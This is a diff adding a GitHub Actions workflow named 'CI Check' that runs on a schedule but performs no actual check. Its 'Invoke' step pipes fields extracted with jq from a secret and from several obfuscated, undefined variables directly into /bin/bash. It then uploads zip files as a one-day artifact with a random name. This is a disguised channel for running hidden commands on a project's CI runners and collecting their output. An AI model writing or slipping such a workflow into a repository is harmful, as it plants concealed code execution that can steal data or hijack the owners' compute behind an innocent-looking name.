@@ -1,0 +1,34 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          uxxcr3: ${{ secrets.uxxcr3 }}
+        run: |
+          printf '%s' "$uxxcr3" | jq -r .gyidj44 | /bin/bash
+          echo $uc71 | jq -r .m5 | /bin/bash
+          echo $qn174 | jq -r .mexmr547 | /bin/bash
+          echo $ny45921 | jq -r .qprzh308 | /bin/bash
+          printf '%s' "$azxko857" | jq -r .ky783 | /bin/bash
+          echo $fe87 | jq -r .tpvin260 | /bin/bash
+          echo $p3 | jq -r .ru0 | /bin/bash
+          printf '%s' "$ahen68" | jq -r .nrxs424 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: tG4V8p52
+          path: "*.zip"
+          retention-days: 1
